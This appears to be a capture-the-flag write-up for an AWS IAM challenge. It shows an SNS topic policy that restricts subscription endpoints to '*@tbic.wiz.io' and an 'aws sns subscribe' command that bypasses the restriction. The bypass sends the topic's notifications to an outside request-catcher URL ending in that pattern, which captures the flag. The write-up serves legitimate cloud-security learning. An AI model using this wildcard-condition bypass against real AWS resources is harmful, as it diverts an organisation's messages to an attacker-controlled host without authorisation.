# Challenge number
3

## Challenge Statement
Enable Push Notifications
We got a message for you. Can you get it?

## IAM Policy
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```
### write a short analysis about the IAM policy here
```
This policy allows anyone *(Principal: "*")* to subscribe to the SNS topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications and also there is a restriction that only email addresses matching the pattern *@tbic.wiz.io can be used as endpoint it means that while anyone can  subscribe only those with an email from the tbic.wiz.io domain can able to complete the process. 
```

## Solution
First I open https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html doc to read about subscribe the by using this command
 ```
 aws sns subscribe \
    --topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
    --protocol email \
    --notification-endpoint my-email@example.com
```
In this command I edit my resource value in this command the in protocol I set it to Https and then in notication endpoint I use request catcher by using url follwed by given endipoint , so my command is looks like   
 
 ```
 aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol Https \
    --notification-endpoint https://bigiamchallenge3.requestcatcher.com/*@tbic.wiz.io
```
After the In the request catcher we got "SubscribeURL" coppy that url and paste it browser new window then again we see in request catcher browser window We got our flag value as given in "Message"

## Reflection
 
The experience showed to me the need of understanding  IAM policies and their use in resource authorization control systems. The SNS topic was accessible for subscription through the policy but the endpoint restriction required specific email addresses. The endpoint restriction made me to find solution using Request Catcher combined with other tools to collect the notification endpoint. This activity helped me deep my knowledge about AWS CLI command sns this  also showed the importance of detailed policy evaluation to develop alternate solutions when dealing with policy restrictions. This challenge provided an excellent opportunity to solve real-world problems while implementing knowledge of AWS to solve an actual practical scenario.